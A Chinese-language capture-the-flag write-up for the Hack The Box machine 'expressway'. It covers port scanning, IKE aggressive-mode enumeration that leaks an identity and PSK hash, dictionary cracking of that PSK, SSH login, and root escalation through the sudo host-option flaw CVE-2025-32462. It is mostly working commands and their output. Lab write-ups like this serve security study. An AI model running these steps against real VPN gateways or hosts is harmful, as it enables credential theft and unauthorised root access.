# 信息收集

```
nmap --min-rate 10000 -p- 10.129.238.52
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-01 15:21 CST
Nmap scan report for 10.129.238.52 (10.129.238.52)
Host is up (0.13s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 10.35 seconds
tcp只开放ssh，不进一步利用

nmap -sU --top-ports 20 10.129.238.52
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-01 15:22 CST
Nmap scan report for 10.129.238.52 (10.129.238.52)
Host is up (0.16s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   closed        ntp
135/udp   closed        msrpc
137/udp   closed        netbios-ns
138/udp   closed        netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   closed        microsoft-ds
500/udp   open          isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  open|filtered nat-t-ike
49152/udp closed        unknown

Nmap done: 1 IP address (1 host up) scanned in 27.80 seconds
```
tcp只开放ssh，转向udp开放isakmp

对udp500进行利用
```
ike-scan -M 10.129.19.97
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.19.97    Main Mode Handshake returned
        HDR=(CKY-R=a75c3aeae422fbcb)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.116 seconds (8.61 hosts/sec).  1 returned handshake; 0 returned notify

ike-scan -P -M -A -n hacker 10.129.19.97
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.19.97    Aggressive Mode Handshake returned
        HDR=(CKY-R=263706561a844745)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
b1fb5eb8e70a8e966d7e82ce9edcd1a047e9b63937a090df14c5568ca31dff05cac4073fe2af130faed9d4486ef5ace4b4b28d6c1dc2ee21e1351b5cd779f11cbc3113520f2bc3ac5560eb34f576306004d29beca5beb32daf20d04fbb7104e39a3b6c7046d53fa195a50e4d3acc56a41b9d6caa1d21a0e5be974f5579ac7c77:b361fdd21f1bf265e4f53706e225919d4a176c936bff85051b6c7db5439971e33ae3000297da47e2f29778601e89ad8e4a5032d8a4a81469e5d890bfb0d3b75221e5ce548d39b3df094a9dfc2dc0ef2db6c29205ebfc587252656d56a1170869a9eab31562f8a80015250ef474d8515b4cd0e57948e7c644774a97b956cc18bb:263706561a844745:06be6f0563285785:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:d9b866b85fcbabec7a4fe7cad4c5bc759124fbb9:89ccf922ccb6e1514d4825fa0f9310dcc1c42d3fd4ad56b639fdf9424ddc99ef:be8838533d86e84a17441c7843ed29dc17038d8b
Ending ike-scan 1.9.6: 1 hosts scanned in 0.119 seconds (8.40 hosts/sec).  1 returned handshake; 0 returned notify
```
可以看到服务端会基于id伪造hash，不过同时也暴露了id
```
ike-scan -P -M -A -n ike@expressway.htb 10.129.19.97
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.19.97    Aggressive Mode Handshake returned
        HDR=(CKY-R=df98dc313310319d)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
8070ae1e673f3b9dec01ec3c4ce1b680ac33de9541499b26c95ade1367d2e3b6ecac6056b11ea3605dbd7ef36cf26aa210088ba1017a8e2afede7f81f0fa2cdb596430cf1f64d57baeda5180a0159f9ed7d2b140469249fdf4005f148482303384ea39724ad7a2d835416b044e085c97cbc44f7f3a29135ff735c305e553e00e:d982778c68b1330ffe6cf7d319fc10fb772ccf65be5385347fe5eb795e24cbf35a0a457b067cf6369fd7e053d3d0f9ce332e5746a0c1ca51b5937dda73b78035e792f79ca61080a3ea96748eefd801cfe6c5c58c8961fd95aa05cec6d153ebaca90460f0ce832740f16023e47dcd2f0313edaa2ddde35a77625dd477c6acdcf9:df98dc313310319d:b4f0ec57822533b9:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:59d8bd04d6aa3f430fba243acee4da65630ade28:b298fd746280c357d303310b63f4cfa3071c19a6c13f3710223d640e08b6a06a:70e467f9fe0ba53e972f8942c05af7526ec02e09
Ending ike-scan 1.9.6: 1 hosts scanned in 0.118 seconds (8.49 hosts/sec).  1 returned handshake; 0 returned notify
```
得到密码
```
psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash 70e467f9fe0ba53e972f8942c05af7526ec02e09
Ending psk-crack: 8045040 iterations in 3.992 seconds (2015108.35 iterations/sec)
```
# 提权

```
ssh ike@10.129.19.97

ike@expressway:~$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
```
ike用户在proxy组，可以看到sudo的版本存在漏洞CVE-2025-32462
```
ike@expressway:~$ sudo -l
Password:
Sorry, user ike may not run sudo on expressway.
ike@expressway:~$ sudo --version
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

接下来找ike有完全权限的子域
```
ike@expressway:~$ find / -group proxy 2>/dev/null
/run/squid
/var/spool/squid
/var/spool/squid/netdb.state
/var/log/squid
/var/log/squid/cache.log.2.gz
/var/log/squid/access.log.2.gz
/var/log/squid/cache.log.1
/var/log/squid/access.log.1
ike@expressway:~$ cat /var/log/squid/access.log.1 | grep htb
1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
ike@expressway:~$
```
可以找到`offramp.expressway.htb`子域，根据文件所属可以猜测尝试
```
sudo -l -h offramp.expressway.htb
Matching Defaults entries for ike on offramp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User ike may run the following commands on offramp:
    (root) NOPASSWD: ALL
    (root) NOPASSWD: ALL
```


```
ike@expressway:~$ sudo -s -h offramp.expressway.htb
root@expressway:/home/ike# id
uid=0(root) gid=0(root) groups=0(root)
```
